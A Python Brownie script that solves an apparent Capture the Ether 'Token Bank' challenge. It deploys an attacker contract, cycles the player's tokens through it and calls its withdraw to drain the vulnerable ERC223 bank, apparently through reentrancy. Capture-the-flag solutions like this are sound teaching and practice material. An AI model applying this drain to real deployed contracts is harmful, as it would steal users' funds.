from lib2to3.pgen2 import token
from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import TokenBankChallenge, SimpleERC223Token, TokenBankAttack

##########################################
# I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens.\
# The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        token_bank = load_challenge(ContractObject=TokenBankChallenge, instance_key='token_bank')
    else:
        _from, acc, _from2, acc2 = define_from_acc(2)
        token_bank = deploy_locally(ContractObject=TokenBankChallenge, from_account=_from2, constructor_params=[acc.address])

    # function to check balances
    def checkBalances():
        print('token bank funds (token): ', simple_erc223_token.balanceOf(token_bank.address))
        print('my funds (token): ', simple_erc223_token.balanceOf(acc.address))
        print('my funds (bank): ', token_bank.balanceOf(acc.address))
        print('attacker funds (token): ', simple_erc223_token.balanceOf(attacker.address))
        print('attacker funds (bank): ', token_bank.balanceOf(attacker.address))

    # get token contract address
    simple_erc223_token = token_bank.token()

    # load the token contract
    simple_erc223_token = SimpleERC223Token.at(simple_erc223_token)

    # deploy attacker contract
    attacker = TokenBankAttack.deploy(token_bank.address, simple_erc223_token.address, _from)
    checkBalances()

    # withdraw my tokens from the token bank
    token_bank.withdraw(token_bank.balanceOf(acc.address), _from)
    checkBalances()

    # send my tokens to the attacker contract
    simple_erc223_token.transfer(attacker.address, simple_erc223_token.balanceOf(acc.address), _from)
    checkBalances()

    # send funds from attacker to bank
    attacker.sendTokensToBank(simple_erc223_token.balanceOf(attacker.address), _from)
    checkBalances()

    # withdraw the contract's tokens from the token bank
    attacker.withdraw(_from | {'allow_revert':True})
    checkBalances()

    # check if the challenge is complete
    result = token_bank.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge(True)
